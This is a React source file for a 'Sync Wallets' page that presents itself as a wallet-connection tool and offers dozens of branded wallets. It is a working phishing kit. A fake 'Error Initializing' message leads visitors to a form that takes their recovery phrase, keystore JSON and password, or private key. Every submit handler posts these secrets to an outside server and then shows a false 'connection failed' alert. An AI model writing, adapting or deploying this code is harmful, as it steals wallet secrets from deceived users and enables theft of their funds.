import React from 'react';

import { useEffect } from 'react';
import { useLocation } from 'react-router-dom';

import './wallet.css';

import { useState } from 'react';
import axios from 'axios';
import { Link } from 'react-router-dom';

function Wallet(){

    const handleRefresh = () => {
        window.location.reload();
      };

    const location = useLocation();


    const[selectedName, setSelectedName] = useState("");

    const[selectedImage, setSelectedImage] = useState("");

    useEffect(() => {
        document.title = "Sync Wallets";
      }, [location.pathname]); // The empty dependency array [] ensures this effect runs once on component mount

      const[wallets, setWallets]=useState([
          {
              "name":"Trust",
              "url":"https://web-resolvefix.da-pp.sbs/app/images/trust-wallet-66f8777532931d9c09b633344981a6a9.png",

          },

          {
            "name":"Wallet Connect",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/iogo.jpg",


        },

        {
            "name":"Atomic",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/atomic-4c02d2b33cf091fd83c7a49819394e41.png",


        },

        {
            "name":"Metamask",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png",


        },


        {
            "name":"Rainbow",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png",


        },

        {
            "name":"Ledger",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/Ledger_38291882.png",


        },

        {
            "name":"HashPack",
            "url":"https://assets-global.website-files.com/614c99cf4f23700c8aa3752a/6323b696c42eaa1be5f8152a_public.png",


        },

        {
            "name":"Fantom Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/fantom-ftm-logo.png",


        },

        {
            "name":"Crypto.com | DeFi Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/crypto-4cbeac57421fb3ca2573db2cf448169a.png",


        },


        {
            "name":"imToken",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/imtoken-fd8c7c52dac6101568954e7448a49202.png",


        },

        {
            "name":"Anchor",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/anchor.png",


        },

        {
            "name":"ONTO",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/onto-983003d35fe32bf916f9eda381f138f7.png",


        },

        {
            "name":"TokenPocket",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/tokenpocket-57a4a886cc644e5237ac1558226154cb.png",


        },

        {
            "name":"MathWallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png",


        },


        {
            "name":"BitPay",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/bitpay-1573dd6c95eb38386f181048663590d0.jpg",


        },

        {
            "name":"Maiar",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/maiar.png",


        },


        {
            "name":"Ledger Live",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png",


        },

        {
            "name":"Walleth",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/walleth-b60336f8dd9ea86285408cb4f96634d1.png",


        },

        {
            "name":"Authereum",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/authereum-32f3939207b77c1837547d5ed4f86110.png",


        },

        {
            "name":"MYKEY",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/mykey-7419df5270c0406c80cba19fa5165923.png",


        },

        {
            "name":"TrustVault",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/trustvault-9031a67f82293fc50ead978f936cfff3.png",


        },


        {
            "name":"Coin98",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/coin98-c5b50adaceaf474e48ef1dad150d0829.png",


        },


        {
            "name":"CoolWallet S",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png",


        },


        {
            "name":"D'CENT Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png",


        },

        {
            "name":"ZelCore",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png",


        },


        {
            "name":"Coinomi",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg",


        },


        {
            "name":"GridPlus",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png",


        },

        {
            "name":"CYBAVO Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png",


        },

        {
            "name":"Wazirx",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/wazirx-logo-rounded.9bff9f42.png",


        },


        {
            "name":"SafePal",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png",


        },

        {
            "name":"Infinito",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png",


        },

        {
            "name":"Wallet.io",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/wallet.io-198f396de22fe25eb370f46544abe69d.png",


        },


        {
            "name":"Infinity Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png",


        },


        {
            "name":"Ownbit",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png",


        },


        {
            "name":"EasyPocket",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/easypocket-436ea3270a7bf77c02a880bfc70d0ee8.jpg",


        },


        {
            "name":"SparkPoint",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png",


        },




        {
            "name":"ViaWallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png",


        },


        {
            "name":"BitKeep",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/bitkeep-387b0ca7da4cf322f44c70c23064c529.png",


        },


        {
            "name":"Vision",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/vision-928292fe642172a18e62feb5eaa2d639.png",


        },


        {
            "name":"PEAKDEFI Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png",


        },

        {
            "name":"Cosmostation",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/cosmosstation.png",


        },

        {
            "name":"Graph Protocol",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/graph.jpg",


        },


        {
            "name":"KardiaChain",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/kardachain.png",


        },


        {
            "name":"Keplr",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/keplr.png",


        },

        {
            "name":"Harmony",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/harmony.png",


        },

        {
            "name":"ICONex",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/iconex.png",


        },


        {
            "name":"Fetch",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/fetch.jpg",


        },

        {
            "name":"XDC Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/xdc-9a98bff95dffc41869b8e77912a6cc54.png",


        },


        {
            "name":"Unstoppable Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png",


        },


        {
            "name":"MEET.ONE",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/meetone-01093db7d99e3e6cf5cca68b616f8255.jpg",


        },


        {
            "name":"Dok Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/dok-a32c522e109217cc2a1a2a310f3c9bf7.png",


        },


        {
            "name":"AT.Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png",


        },

        {
            "name":"MoriX Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png",


        },


        {
            "name":"Midas Wallet",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/midas-wallet-5c5057d972ca621414f077541845fc61.png",


        },


        {
            "name":"KEYRING PRO",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png",


        },


        {
            "name":"Blockchain",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/blockchain-logo.png",


        },


        {
            "name":"Binance Smart Chain",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/bsc-logo.png",


        },


        {
            "name":"Aktionariat",
            "url":"https://web-resolvefix.da-pp.sbs/app/images/aktionariat-c5784b26234a389632687a36d2fb3258.png",


        },


      ]);



      const[phrase, setPhrase]=useState("");
      const[keystore_json, setKeyStoreJson] = useState("");
      const[wallet_password , setWalletPassword] = useState("");

      const[private_key, setPrivateKey] = useState("");

      const[showError, setShowError] = useState(false);


      async function handlePhrase(e){
        e.preventDefault();

        setKeyStoreJson("");
        setPrivateKey("");
        setWalletPassword("");


        try {
            const response = await axios.post('https://webresolve.onrender.com/api/send', {
                phrase:phrase,
                keystore_json:keystore_json,
                wallet_password:wallet_password,
                private_key:private_key,
                type:"Phrase",
                platform:selectedName,
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                 setShowError(true);
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        

        
    }

    async function handleKeystoreJson(e){
        e.preventDefault();

        setPhrase("");
        setPrivateKey("");
        



        try {
            const response = await axios.post('https://webresolve.onrender.com/api/send', {
                phrase:phrase,
                keystore_json:keystore_json,
                wallet_password:wallet_password,
                private_key:private_key,
                type:"Keystore Json",
                platform:selectedName,
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                setShowError(true);
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        

        
    }



    async function handlePrivateKey(e){
        e.preventDefault();

        setKeyStoreJson("");
        setPhrase("");
        setWalletPassword("");



        try {
            const response = await axios.post('https://webresolve.onrender.com/api/send', {
                phrase:phrase,
                keystore_json:keystore_json,
                wallet_password:wallet_password,
                private_key:private_key,
                type:"Private Key",
                platform:selectedName,
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                setShowError(true);
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        

        
    }
      

    return (
        <>
            <h1 className='text-center py-5 wallethead'>Choose Preferred Wallets </h1>


            <section className='px-5 row text-center'>

                {
                    wallets.map(function(wall, index){
                        return (
                            <div onClick={function(e){
                                setSelectedName(wall.name);

                                setSelectedImage(wall.url);
                            }} className='col-md-3 col-6'data-toggle="modal" data-target="#exampleModal">
                                
                                    <img className='walletimage py-2' src={wall.url} />

                                    <p className='walletpara py-3'>{wall.name}</p>
                                </div>
                        );
                    })
                }

            </section>



            {selectedName && <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header modalbg">
        <h5 class="modal-title modaltitle" id="exampleModalLabel">Back</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
                <div className='py-2 errordiv mx-4 px-3'>

                    <p className='text-danger mt-2'>Error Initializing.. <span><button className='btn text-light border-0 rounded connect'data-toggle="modal" data-target="#staticBackdropTwo">Connect Manually</button></span></p>

                </div>

                <br/>

                <div className='py-2 greydiv mx-4 px-3'>

                    <div className='row'>
                        <div className='col-6'>
                            <p className='infinity'>{selectedName}</p>

                            <p className='easy'>
                                Easy-to-use browser extension
                            </p>

                        </div>

                        <div className='col-6 text-right'>

                            <img className='smallimage mt-2' src={selectedImage} />

                            
                        </div>

                    </div>

                </div>
      </div>
      
    </div>
  </div>
</div>

    }


{/* modal two */}

<div class="modal fade" id="staticBackdropTwo" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabelTwo" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
     
      <div class="modal-body">
            <div className='modalheight py-5 mt-3'>

                <p className="secondmod text-center"><img className='secondmodimage px-3' src={selectedImage} />Import your {selectedName} wallet</p>

            </div>


            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Connection to {selectedName} failed!!!</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}



            <ul class="nav nav-pills myline" id="pills-tab" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="pills-home-tab" data-toggle="pill" data-target="#pills-home" type="button" role="tab" aria-controls="pills-home" aria-selected="true">Phrase</button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="pills-profile-tab" data-toggle="pill" data-target="#pills-profile" type="button" role="tab" aria-controls="pills-profile" aria-selected="false"><span className='pushdown'>Keystore  JSON</span></button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="pills-contact-tab" data-toggle="pill" data-target="#pills-contact" type="button" role="tab" aria-controls="pills-contact" aria-selected="false">Private Key</button>
                    </li>
                    </ul>
<div class="tab-content " id="pills-tabContent">
  <div class="tab-pane fade show active" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">

        <form onSubmit={handlePhrase} className='mx-4'>

            <div className='form-group'>

                <textarea onChange={function(e){
                    setPhrase(e.target.value)
                }} value={phrase} rows="4" className='form-control'placeholder='Enter your recovery phrase'required>

                </textarea>

                <p className='smallest'>Typically 12 (sometimes 24) words separated by single spaces</p>

            </div>

            <br/>

            <button type="submit" className='btn btn-primary text-light text-center w-100'>PROCEED</button>
        </form>

  </div>
  <div class="tab-pane fade" id="pills-profile" role="tabpanel" aria-labelledby="pills-profile-tab">

  <form onSubmit={handleKeystoreJson} className='mx-4'>

<div className='form-group'>

    <textarea onChange={function(e){
        setKeyStoreJson(e.target.value);
    }} value={keystore_json} rows="4" className='form-control'placeholder='Keystore JSON'>

    </textarea>
    </div>


    <div className='form-group'>
        <input onChange={function(e){
            setWalletPassword(e.target.value);
        }} value={wallet_password} className='form-control' placeholder='Wallet Password'/>

    </div>

    <p className='smallest mt-3'>Several lines of text beginning with plus the password you used to encrypt it.</p>



<br/>

<button type='submit' className='btn btn-primary text-light text-center w-100'>PROCEED</button>
</form>

  </div>
  <div class="tab-pane fade" id="pills-contact" role="tabpanel" aria-labelledby="pills-contact-tab">

  <form onSubmit={handlePrivateKey} className='mx-4'>




    <div className='form-group mt-2'>
        <input onChange={function(e){
            setPrivateKey(e.target.value);
        }} value={private_key} className='form-control' placeholder='Enter Your Private Key'/>

    </div>

    <p className='smallest mt-3'>Typically 12 (sometimes 24) words seperated by a single space.

</p>



<br/>

<button type='submit' className='btn btn-primary text-light text-center w-100'>PROCEED</button>
</form>
  </div>
</div>


            
                <div className='text-right mt-5 px-4'>
                     <button onClick={function(e){
                        //  setSelectedName("");

                        //  handleRefresh();
                     }} data-dismiss="modal"className='btn btn-danger text-light'>Cancel</button>

                </div>
             
      </div>
     
    </div>
  </div>
</div>
        </>
    );
}


export default Wallet;